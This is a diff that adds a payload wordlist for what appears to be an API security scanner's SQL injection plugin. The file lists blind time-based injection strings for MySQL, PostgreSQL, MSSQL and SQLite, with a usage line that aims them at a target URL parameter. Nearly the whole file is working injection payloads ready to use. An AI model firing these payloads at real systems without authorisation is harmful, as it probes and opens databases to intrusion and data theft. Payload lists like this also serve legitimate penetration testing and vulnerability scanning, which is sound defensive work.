@@ -1,0 +1,29 @@
+# SQL Injection Payloads — Blind time-based (MySQL, PostgreSQL, MSSQL, SQLite)
+# NOTE: These introduce intentional delays. Use with --timeout 10 or higher.
+# Usage:
+#   apileaks req GET "http://target/api?id=1" \
+#     --plugin sqlinjection --parameters id --timeout 10 \
+#     --payload-file wordlists/sqli-blind-time.txt
+
+# MySQL
+' AND SLEEP(2)--
+" AND SLEEP(2)--
+1 AND SLEEP(2)--
+' AND SLEEP(2) AND '1'='1
+1; SELECT SLEEP(2)--
+' OR SLEEP(2)--
+' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--
+1; SELECT IF(1=1,SLEEP(2),0)--
+
+# PostgreSQL
+'; SELECT pg_sleep(2)--
+' AND 1=(SELECT 1 FROM pg_sleep(2))--
+1; SELECT pg_sleep(2)--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:2'--
+1; WAITFOR DELAY '0:0:2'--
+' WAITFOR DELAY '0:0:2'--
+
+# SQLite
+' AND 1=1 AND RANDOMBLOB(999999999)--
